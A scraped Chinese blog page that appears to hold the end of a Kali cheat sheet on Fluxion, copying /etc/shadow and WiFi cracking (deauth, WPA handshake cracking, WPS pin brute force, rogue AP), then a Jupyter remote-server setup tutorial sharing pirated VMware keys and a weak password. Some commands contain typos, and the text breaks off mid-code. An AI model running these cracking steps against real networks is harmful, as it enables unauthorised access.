<h2 id="十、Fluxion"><a href="#十、Fluxion" class="headerlink" title="十、Fluxion"></a>十、Fluxion</h2><h3 id="10-1-Fluxion下载"><a href="#10-1-Fluxion下载" class="headerlink" title="10.1 Fluxion下载"></a>10.1 Fluxion下载</h3><p>下载fluxion源码并进入fluxion且运行：<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone http<span class="variable">s:</span>//github.<span class="keyword">com</span>/FluxionNetwork/fluxion.git  </span><br><span class="line"><span class="keyword">cd</span> fluxion</span><br><span class="line">./fluxion.<span class="keyword">sh</span></span><br><span class="line">若提示没下载fluxion.<span class="keyword">sh</span>，则按照要求下载就行</span><br></pre></td></tr></table></figure></p>
<h2 id="十一、密码破解"><a href="#十一、密码破解" class="headerlink" title="十一、密码破解"></a>十一、密码破解</h2><ul>
<li><p>查看kali本机的密码字典</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">locate wordlist</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>查看某个密码文件</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="regexp">/etc/</span>shadow</span><br></pre></td></tr></table></figure>
</li>
<li><p>拷贝/etc/shadow密码文件</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp <span class="regexp">/etc/</span>shadow<span class="regexp">/ /</span>root<span class="regexp">/Desktop/</span>hash.list</span><br></pre></td></tr></table></figure>
</li>
<li><p>more /etc/login.defs</p>
</li>
</ul>
<h2 id="十二、Hydra"><a href="#十二、Hydra" class="headerlink" title="十二、Hydra"></a>十二、Hydra</h2><p>1</p>
<h2 id="十三、无线破解"><a href="#十三、无线破解" class="headerlink" title="十三、无线破解"></a>十三、无线破解</h2><p>首先做的三步：<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service network-manager stop</span><br><span class="line">airmon-ng<span class="built_in"> check </span>kill</span><br><span class="line">aiarmon-ng start wlan0</span><br></pre></td></tr></table></figure></p>
<p>开启监听：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng statr wlan0</span><br></pre></td></tr></table></figure></p>
<p>监听所有：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br></pre></td></tr></table></figure></p>
<p>监听指定bssid：<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon <span class="comment">--bssid XXXX -c 频道 -w wpa(保存名)</span></span><br></pre></td></tr></table></figure></p>
<p>将连接打掉：<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -<span class="number">0</span> <span class="number">2</span> -a <span class="string">[mac地址]</span> -c <span class="string">[客户端mac地址]</span> wlan0mon</span><br></pre></td></tr></table></figure></p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifconfig wlan0mon <span class="meta">down</span></span><br><span class="line">ifconfig wlan0mon <span class="meta">up</span></span><br></pre></td></tr></table></figure>
<p>破解：<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w <span class="string">[字典]</span> /root/XXX.cap</span><br></pre></td></tr></table></figure></p>
<p>kali自带常用字典目录：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/john/</span>password.lst</span><br><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/wfuzz/</span>wordlist<span class="regexp">/</span></span><br></pre></td></tr></table></figure></p>
<p>查看字典文件是否含有该密码：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">grep</span> <span class="selector-tag">Password</span> <span class="selector-tag">password</span><span class="selector-class">.lst</span></span><br></pre></td></tr></table></figure></p>
<p>查看字典有多少行：<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat [字典] <span class="string">| wc -l</span></span><br></pre></td></tr></table></figure></p>
<p>解压文件：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gunzip rockyou<span class="selector-class">.txt</span><span class="selector-class">.gz</span></span><br></pre></td></tr></table></figure></p>
<hr>
<p>发现支持wps的AP<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wash -<span class="selector-tag">i</span> wlan0mon</span><br><span class="line">或者是</span><br><span class="line">airodump-ng wlan0mon --wps</span><br></pre></td></tr></table></figure></p>
<p>爆破pin码：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reaver -<span class="selector-tag">i</span> wlan0mon -<span class="selector-tag">b</span> [ap mac] -vv -c [信道]</span><br></pre></td></tr></table></figure></p>
<hr>
<p>wifite</p>
<hr>
<p>伪造wifi：<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airbase-ng -a <span class="string">[ap_mac]</span> -c <span class="string">[信道]</span> --essid <span class="string">[wifi名字]</span> wlan0mon</span><br></pre></td></tr></table></figure></p>
<p>```<br>echo [ap(wifi名)] &gt;essid.txt<br>airolib-ng essid_db —import essid essid.txt<br>airolib-ng essid_db —stats<br>airolib-ng essid_db —import password ./names.txt<br>airolib-ng essid_db —batch<br>aircrack-ng -r essid_fb /root/wpa-01.cap</p>

        </div></article>
      <article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2018/09/23/Xshell远程连接linux并远程访问ipython服务/">Xshell远程连接linux并远程访问Jupyter notebook服务（机器学习环境的搭建）</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2018-09-23
        </span><span class="post-category">
            <a href="/categories/Python/">Python</a>
            </span>
        </div>
    </header>

    <div class="post-content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>如今，机器学习、人工智能、深度学习等高深知识逐渐融入大家的视野，为了跟上技术的更新，不被时代所淘汰、out、出局，博主也想打算开始深度学习。而据说如今机器学习最好的环境是Python + Jupyter notebook + Tensorflow了，为此首先需要搭建一个这么个环境，以便开始深度学习之旅。此外，若能搭建一个自己的深度学习服务器再好不过了，所以本文将从以下三个部分的内容进行介绍：</p>
<ul>
<li>环境准备</li>
<li>Xshell远程连接Ubuntu</li>
<li>Jupyter notebook服务器的配置及远程访问</li>
<li>远程环境的测试</li>
</ul>
<p>OK，话不多说，开始进入正轨吧。(#`O′)</p>
<p><img src="https://ws3.sinaimg.cn/bmiddle/9150e4e5gy1fxklkcjfp8j20c80c80sx.jpg" width="200"></p>
<hr>
<h2 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h2><h3 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h3><ul>
<li>准备两台计算机，一个作为服务端，一个作为客户端。</li>
<li>服务端：Linux系统（<a href="https://www.ubuntu.com/download/desktop" target="_blank" rel="noopener">Ubuntu</a>）<br><a href="https://baike.baidu.com/item/ubuntu/155795?fr=aladdin" target="_blank" rel="noopener">官方介绍</a>：Ubuntu（友帮拓、优般图、乌班图）是一个以桌面应用为主的开源GNU/Linux操作系统，Ubuntu 是基于Debian GNU/Linux，支持x86、amd64（即x64）和ppc架构，由全球化的专业开发团队（Canonical Ltd）打造的。<br>Linux系统区别于windows系统最大的区别是其主要是利用终端 Shell 命令来进行一系列的操作，所以在实际使用过程中常常用来搭建服务器，该系统搭建在VMware虚拟机中。</li>
<li>客户端：Windows10系统<br>这个大家再熟悉不过了，就不介绍了。</li>
<li><a href="https://www.anaconda.com/download/" target="_blank" rel="noopener">Anaconda</a><br><a href="https://baike.baidu.com/item/anaconda/20407441?fr=aladdin" target="_blank" rel="noopener">官方介绍</a>：Anaconda指的是一个开源的Python发行版本，其包含了conda、Python等180多个科学包及其依赖项。<br>所以说，当我们下载了Anaconda之后就不必要再下载Python其他包了，其内部集成了大量大Python工具，其中就包括我们这篇文章的主角Jupyter notebook。</li>
<li><a href="https://xshell.en.softonic.com/?ex=BB-682.0" target="_blank" rel="noopener">Xshell</a><br>这个就没什么好说的了，它主要是一种远程连接的工具，使用它之后我们就可以通过ssh协议来远程连接Ubuntu系统了，而且它常常与远程文件传输工具Xftp配套使用。</li>
</ul>
<h3 id="软件下载"><a href="#软件下载" class="headerlink" title="软件下载"></a>软件下载</h3><p>这里给大家两种方式进行下载，一个是官网下载，一个是鄙人的网盘下载，大家根据自己的方便下载即可。</p>
<p>官网：</p>
<ul>
<li>Anaconda：<a href="https://www.anaconda.com/download" target="_blank" rel="noopener">https://www.anaconda.com/download/</a>，于服务端下载</li>
<li>Xshell：<a href="https://xshell.en.softonic.com/?ex=BB-682.0" target="_blank" rel="noopener">https://xshell.en.softonic.com/?ex=BB-682.0</a>，于客户端下载</li>
<li>Ubuntu：<a href="https://www.ubuntu.com/download/desktop" target="_blank" rel="noopener">https://www.ubuntu.com/download/desktop</a>，于服务端下载</li>
<li>VMware：<a href="https://www.vmware.com/" target="_blank" rel="noopener">https://www.ubuntu.com/download/desktop</a>，于服务端下载</li>
</ul>
<p>网盘：</p>
<ul>
<li>Anaconda：<a href="https://pan.baidu.com/s/1Z4XuYwYvK6CqJigSrEWjuQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1Z4XuYwYvK6CqJigSrEWjuQ</a>， 密码：<code>1pbs</code>，于服务端下载</li>
<li>Xshell：<a href="https://pan.baidu.com/s/1KKqsFrhbPUM2Yc_Jukm5sw" target="_blank" rel="noopener">https://pan.baidu.com/s/1KKqsFrhbPUM2Yc_Jukm5sw</a>， 密码：<code>fi0y</code>，于客户端下载</li>
<li>Ubuntu：<a href="https://pan.baidu.com/s/1Zwz1GGlEtlStnS-5OFsecQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1Zwz1GGlEtlStnS-5OFsecQ</a>， 密码：<code>50yw</code>，于服务端下载</li>
<li>VMware：<a href="https://pan.baidu.com/s/1-h0HLJGrXbJjwzfU5I2rww" target="_blank" rel="noopener">https://pan.baidu.com/s/1-h0HLJGrXbJjwzfU5I2rww</a>， 密码：<code>hjnq</code>，于服务端下载</li>
</ul>
<h3 id="VMware下安装Ubuntu"><a href="#VMware下安装Ubuntu" class="headerlink" title="VMware下安装Ubuntu"></a>VMware下安装Ubuntu</h3><font color="red">注意：以下内容都是在服务端计算机中进行配置</font>

<p>在VMware虚拟机下安装Ubuntu系统虽然有点步骤，但是并不复杂。在综合考虑到时间成本与其给大家带来的价值的关系下，博主就用文字描述了，暂时不贴图了。但是你不必担心，关键步骤还是会贴图说明的 ( ﹁ ﹁ ) ~→。</p>
<ul>
<li><p>在服务端下载好VMware及Ubuntu之后。首先打开VMware你会发现他会让你输入VMware秘钥，以下将给出几个目前有效的秘钥，当你使用的时候也许已经失效了，你可以自行百度查找秘钥：</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FF31K-AHZD1-H8ETZ<span class="number">-8</span>WWEZ-WUUVA</span><br><span class="line">CV7T2<span class="number">-6</span>WY5Q<span class="number">-48</span>EWP-ZXY7X-QGUWD</span><br><span class="line">ZY5H0-D3Y8K-M89EZ-AYPEG-MYUA8</span><br><span class="line">ZC5XK-A6E0M<span class="number">-080</span>XQ<span class="number">-04</span>ZZG-YF08D</span><br><span class="line">ZY5H0-D3Y8K-M89EZ-AYPEG-MYUA8</span><br></pre></td></tr></table></figure>
</li>
<li><p>输入秘钥之后 ，进入到了VMware的页面了，为了缩短文章的字数，博主还是使用windows自带的mspaint来绘制一个流程图来为大家介绍下Ubuntu的安装吧，尽量简洁明了：<br><img src="https://gss0.baidu.com/9vo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/c995d143ad4bd11352793d7557afa40f4afb05c4.jpg" width="600"></p>
</li>
</ul>
<p>原本以为制作这个流程图用不了多少时间，结果却用了20分钟，但是如此一来思路清晰、逻辑性强，值了（好吧，不吹自己了，还有很大的提升空间），w(ﾟДﾟ)w。好了，至此Ubuntu就已经安装好了，如果有卡壳的地方可在文章末留言或者左侧的Gitalk留言。</p>
<h3 id="Ubuntu下Anaconda的安装"><a href="#Ubuntu下Anaconda的安装" class="headerlink" title="Ubuntu下Anaconda的安装"></a>Ubuntu下Anaconda的安装</h3><p>在VMware下安装好Ubuntu后，虽然Ubuntu内自带了Python，但是其版本是2.7的，而且许多常用的包并没用集成，所以我们还需要安装Anaconda。</p>
<p>根据以上Anaconda的下载方式下载Anaconda，进入到其目录之下（或者<code>cd</code>操作），然后打开终端，执行如下命令进行安装：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">bash</span> <span class="selector-tag">Anaconda3-5</span><span class="selector-class">.3</span><span class="selector-class">.1-Linux-x86_64</span><span class="selector-class">.sh</span>    # 不要盲目的复制粘贴，根据自己所下载的<span class="selector-tag">Anaconda</span>版本执行</span><br></pre></td></tr></table></figure></p>
<p>执行之后会有一些列诸如同意协议之类的问题，我们默认即可（直接Enter，或者yes），直到出现Anaconda环境变量配置的显示，我们需要选择将其加入到环境变量中去。<br>一系列操作之后，我们关闭终端然后在重新打开终端，然后在终端分别执行<code>conda list</code>、<code>python</code>命令，如果你的终端界面出现类似以下输出，则恭喜你说明你已经完成了anaconda的安装。<br><img src="https://gss0.baidu.com/94o3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/37d3d539b6003af3aa185627382ac65c1138b6d3.jpg" width="600"></p>
<p>而如果你的终端输错报错（未找到<code>conda</code>命令之类的）或者Python版本为2.7，那就说明你以上操作中未将Anaconda加入到环境变量，所以你需要手动配置Anaconda的环境变量，操作如下：<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 打开环境变量的配置文件，从这里我们就可以看出Linux和Windows下的操作的区别了</span></span><br><span class="line"><span class="meta"># windows一般是通过界面的形式进行设置，而Linux下则大多数通过终端并使用vim进行配置</span></span><br><span class="line">sudo vim gedit /root/.bashrc</span><br></pre></td></tr></table></figure></p>
<p>打开文件之后我们需要在文件末尾添加如下内容<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">export</span> <span class="attribute">PATH</span>=<span class="string">"XXX:<span class="variable">$PATH</span>"</span>   # XXX为你的Anaconda的bin目录，例如我的是/home/lxj/anaconda3/bin</span><br></pre></td></tr></table></figure></p>
<p>然后保存，在终端输入source ~/.bashrc进行更新即可完成Anaconda环境变量的配置，不出意外的话再次分别执行<code>Python</code>、<code>conda list</code>命令之后你会看见正确的输出了。</p>
<blockquote>
<p>补充：这里需要说明一下，以上的操作是使用Vim进行文件编辑的，他不同于windows下的记事本等，而是通过特定的操作来对文件进行编辑。对于熟悉Vim操作的应该会理解以上Anaconda环境变量的配置，然而如果是对Vim比较陌生的朋友可能会卡壳，所以在这里简单介绍一些vim的操作。</p>
<blockquote>
<p>在终端使用vim命令之后将会进入到vim的界面，此时的界面是不允许modify任何内容的，只允许read only。此时我们输入i将会进入到vim的编辑模式，现在就能对该文件进行修改了。<br>文件内容修改完成之后，我们需要退出该vim编辑模式，vim 的退出常用的有以下几种（首先输入Esc键）：</p>
<ol>
<li>q! -&gt; 不保存文件修改并退出</li>
<li>wq -&gt; 保存文件的修改并退出</li>
<li>wq! -&gt; 有时候我们需要root权限才能编辑文件，使用该命令之后就能够强制修改并退出<br>对于以上Anaconda环境变量的配置，vim的熟悉至此就足够了，但是顺便介绍一下其他常用的命令供大家参考，也是记录一下方便以后的回顾：</li>
<li>dd -&gt; 剪切当行内容</li>
<li>Ctrl+b -&gt; 内容向前移动一页</li>
<li>ctrl+f -&gt; 内容向后移动爷爷</li>
<li>shift+g -&gt; 鼠标指针定位到最后<br>常用的就是以上一些了，其他的操作有需要的话在来看看。</li>
</ol>
</blockquote>
</blockquote>
<font color="red">注意：以上内容都是在服务端计算机中进行配置</font>

<p>好了，好了，好了。至此，我们已经完成了环境的搭建，接下来我们将介绍如何使用Xshell远程连接Ubuntu操作，拿好你的小板凳快快做好。</p>
<p><img src="https://ss0.baidu.com/73x1bjeh1BF3odCf/it/u=1767287260,2111886590&fm=85&s=CA03E00315D37DE986D8C5700300D073"></p>
<hr>
<h2 id="二、Xshell远程连接Ubuntu"><a href="#二、Xshell远程连接Ubuntu" class="headerlink" title="二、Xshell远程连接Ubuntu"></a>二、Xshell远程连接Ubuntu</h2><font color="red">注意：以下内容都是在客户端计算机中进行配置</font>

<p>安装好Anaconda之后，我们需要通过Xshell使用Xshell来远程连接我们的Ubuntu系统，此时我们的目标需要转移至客户端了。<br>首先在以上软件下载中根据链接下载Xshell，之后Windows傻瓜式安装好Xshell（顺便把Xftp安装下，与Xshell配套使用的，虽然在本文中使用不到）。之后的操作会有几个坑，但是不必担心，博主会带你一个一个的填掉 o(*≧▽≦)ツ┏━┓。</p>
<p>坑一：连接失败<br>我们双击打开Xshell，并点击<code>文件</code>并新建，然后根据如下图进行操作：<br><img src="https://gss0.baidu.com/94o3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/7dd98d1001e9390191a0077976ec54e737d196d3.jpg" width="600"> </p>
<blockquote>
<p>补充，上方中的主机属性是填Ubuntu的ip地址，该地址可在Ubuntu的终端执行ifconfig（windows是ipconfig）命令得到。</p>
</blockquote>
<p>以上信息填写完之后在出现的界面输入自己Ubuntu下的用户登录密码即可。<br>执行之后你花发现连接失败，此时需要检查一下Ubuntu是否与客户端处于同一网段下，可以将Ubuntu设置成桥接模式（右键Ubuntu虚拟机然后进行设置），之后再次检查一下客户端（Windows10）是否能够ping通服务端（Ubuntu），在客户端的cmd中执行如下：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ping</span> <span class="selector-tag">XXX</span><span class="selector-class">.XXX</span><span class="selector-class">.XXX</span><span class="selector-class">.XXX</span>    # <span class="selector-tag">XXX</span><span class="selector-class">.XXX</span><span class="selector-class">.XXX</span><span class="selector-class">.XXX</span>为服务端的<span class="selector-tag">ip</span></span><br></pre></td></tr></table></figure></p>
<p>在以上操作之后，一般就能ping通了，如果失败了则在Ubuntu终端下执行<code>sudo wfw disable</code>命令关闭防火墙。</p>
<p>坑二：连接失败 (ノへ￣、)</p>
<p>在如上操作之后，我们再次尝试重新连接。我们可以发现依然连接失败，显示拒绝连接之类的信息。这是因为Xshell是通过ssh协议来连接Ubuntu的，但是Ubuntu默认是没有开启ssh服务的，所以我们需要在其终端执行如下命令来开启ssh服务：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo<span class="built_in"> service </span>ssh restart</span><br></pre></td></tr></table></figure></p>
<p>之后我们再次尝试连接。</p>
<p>坑三：连接失败 (ノへ￣、) (ノへ￣、)</p>
<p>一般来讲，这个时候依然是连接失败，此时我们需要安装在Ubuntu下安装ssh服务，执行以下命令进行安装：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> install openssh-server</span><br></pre></td></tr></table></figure></p>
<p>待其安装好后，我们再再再次连接Ubunut。</p>
<p>OK，以上坑踩过之后也该连接成功了吧。的确此时你将成功连接到Ubuntu了，之后Xshell将打开一个终端，这个终端就是Ubuntu下的终端了，也就是说我们可以使用该终端控制Ubuntu了，并对其进行Shell操作。ヽ(✿ﾟ▽ﾟ)ノ<br><img src="https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=1598723784,1130004174&fm=11&gp=0.jpg" width="200"></p>
<hr>
<h2 id="三、Jupyter-notebook服务器的配置及远程访问"><a href="#三、Jupyter-notebook服务器的配置及远程访问" class="headerlink" title="三、Jupyter notebook服务器的配置及远程访问"></a>三、Jupyter notebook服务器的配置及远程访问</h2><p>由于我们在之前已经安装过了Anaconda，所以此时的Ubuntu就已经集成了<code>ipython</code> as well as （秀一下英语，虽然很烂）<code>jupyter-notebook</code>，对此，将通过Xshell远程连接Ubuntu来搭建Jupyter notebook的服务器，并对其进行远程访问。</p>
<ul>
<li>在终端中启动ipython或者python，然后执行以下命令<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from IPython<span class="selector-class">.lib</span> import passwd</span><br><span class="line"><span class="function"><span class="title">passwd</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>上述命令执行之后将会在终端显示设置密码，比如在这我们将密码设置成：123，之后enter并确认即可。</p>
<font color="red">注意：这里的密码是暗文的形式，输入之后不会显示的，还有此时你输入的密码需要记住，因为我们待会远程访问jupyter notebook服务器的时候需要用到该密码进行登录</font>

<p>密码输入之后，我们将会看到有一个较长字符串，该字符串是上述密码的加密形式，我们需要将其复制下来，在之后的ipython_notebook_config.py文件的设置中需要使用，操作结果如下图所示：<br><img src="https://gss0.baidu.com/94o3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/9825bc315c6034a88e4032c6c6134954082376d3.jpg" width="600"></p>
<ul>
<li>随后为了方便上述加密密码字符串的记录，我们在此开启另一个终端（这也是Xshell的方便所在），然后使用如下命令创建一个服务器名，比如，在此我们将该名字设置为：XXX<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipython<span class="built_in"> profile </span>create txj</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>在上述服务器名创建完成之后，将在终端输出两个py文件（ipython_config.py、ipython_kernel_config.py）路径，之后使用如下cd命令我们进入到.ipython路径<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">.ipython/</span></span><br></pre></td></tr></table></figure></p>
<p>操作图示如下：<br><img src="https://gss0.baidu.com/-vo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/d788d43f8794a4c2786d6d6c03f41bd5ad6e392e.jpg" width="600"></p>
<ul>
<li>进入<code>.ipython</code>目录之后使用<code>ls</code>命令将会列出上述创建的两个py文件所在，但是我们需要再额外创建一个py配置文件并对其进行设置，在这里我们使用vim来进行操作，关于vim的使用，上述的Anaconda环境配置过程中已经介绍了，遗忘的朋友可以返回看一看再熟悉一下。熟悉之后我们完成如下步骤：<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> .ipython/profile_txj     # 终端进入.ipython路径</span><br><span class="line"><span class="keyword">vim</span> ipython_notebook_config.<span class="keyword">py</span>   # 使用<span class="keyword">vim</span>进行创建ipython_notebook_config.<span class="keyword">py</span>并对其进行编辑</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>进入到vim环境之后我们在ipython_nnotebook_config.py文件中编辑如下内容：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c = get_config()</span><br><span class="line">c.IPKernelApp.pyalb = <span class="string">"inline"</span></span><br><span class="line">c.NotebookApp.ip = <span class="string">"*"</span></span><br><span class="line">c.NotebookApp.open_browser = <span class="keyword">False</span></span><br><span class="line">c.NotebookApp.allow_root = <span class="keyword">True</span></span><br><span class="line">c.NotebookApp.password = <span class="string">u"加密后的密码"</span>    <span class="comment"># 这里我们需要使用上述加密后的密码，在另一个终端可见</span></span><br><span class="line">c.NotebookApp.port = <span class="number">8888</span>   <span class="comment"># 在这里，我们需要设置一个jupyter-notebook的端口，尽量设置的少见点，以免造成端口冲突</span></span><br></pre></td></tr></table></figure></p>
<p>编辑好后，<code>wq</code>命令保存并退出。</p>
<ul>
<li>在上述一切操作完成之后，我们现在来开启该服务器，新建一个终端并执行如下命令<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">jupyter </span>notebook --<span class="built_in">config</span>=你的ipython_notebook_config.py文件路径    </span><br><span class="line"><span class="comment"># 例如/home/lxj/.ipython/profile_XXX/ipython_notebook_config.py</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>在上述命令执行之后，如果出现如下图片所示内容，则说明我们的服务端已经正常启动<br><img src="https://gss0.baidu.com/-fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/2cf5e0fe9925bc3192e98bdf53df8db1ca1370c5.jpg" width="600"></p>
<p><img src="https://gss0.baidu.com/-4o3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/377adab44aed2e73cf740c6b8a01a18b86d6fadc.jpg" width="600"></p>
<ul>
<li>在服务端启动完成之后，我们在客户端打开浏览器，访问<code>XXX.XXX.XXX.XXX:8888</code>（ubuntu的ip加开放的端口）试试，看看能否正常请求。如果随后出现一个如上所示的Jupyter notebook的登录页面，那么恭喜你，至此Jupyter notebook服务器配置完成，并能够远程访问了。在表单中输入你所设置的密码（上面第一步设置的密码，123）即可开始你的深度学习之旅了。</li>
</ul>
<p>以上就是Jupyter notebook服务器的配置及远程访问的内容了，但是能否正常使用<code>requests、numpy、pandas、matplotlib、Tensorflow</code>呢，我们下面将通过几个简单的例子来对其进行测试。<br><img src="https://ss1.bdstatic.com/70cFvXSh_Q1YnxGkpoWK1HF6hhy/it/u=2709137771,173445446&fm=27&gp=0.jpg"></p>
<hr>
<h2 id="四、远程环境的测试"><a href="#四、远程环境的测试" class="headerlink" title="四、远程环境的测试"></a>四、远程环境的测试</h2><p>通过上述的操作，我们已经完成了远程操作。但是保险起见，我们对其进行验证，看看anaconda下的第三方包能否正常使用。为此，我们通过以下几个案例来进行验证：</p>
<ul>
<li>百度及其子链接的简单爬虫（requests， BeautifulSoup）</li>
<li>数据可视化操作（pandas，numpy，matplotlib，skimage）</li>
<li>机器学习之鸢尾花的分类预测（sklearn， numpy）</li>
</ul>
<h3 id="4-1-简单爬虫"><a href="#4-1-简单爬虫" class="headerlink" title="4.1 简单爬虫"></a>4.1 简单爬虫</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_page</span><span class="params">(url, headers)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> requests.get(url).text</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    baidu_url = <span class="string">"https://www.baidu.com"</span></span><br><span class="line">    baidu_soup = BeautifulSoup(get_page(baidu_url), <span class="string">"lxml"</span>)</span><br><span class="line">    son_links = [biaoqian_a.attrs[<span class="string">"href"</span>] <span class="keyword">for</span> biaoqian_a <span class="keyword">in</span> baidu_soup.find_all(<span class="string">"a"</span>)]</span><br><span class="line">    <span class="keyword">for</span> index, son_link <span class="keyword">in</span> enumerate(son_links):</span><br><span class="line">        print(<span class="string">"正在请求第&#123;&#125;个页面"</span>.format(str(index)))</span><br><span class="line">        print(get_page(son_link))</span><br></pre></td></tr></table></figure>
<h3 id="4-2-数据可视化"><a href="#4-2-数据可视化" class="headerlink" title="4.2 数据可视化"></a>4.2 数据可视化</h3><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">% matplot inline</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="title">from</span> amtplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> skimage</span><br><span 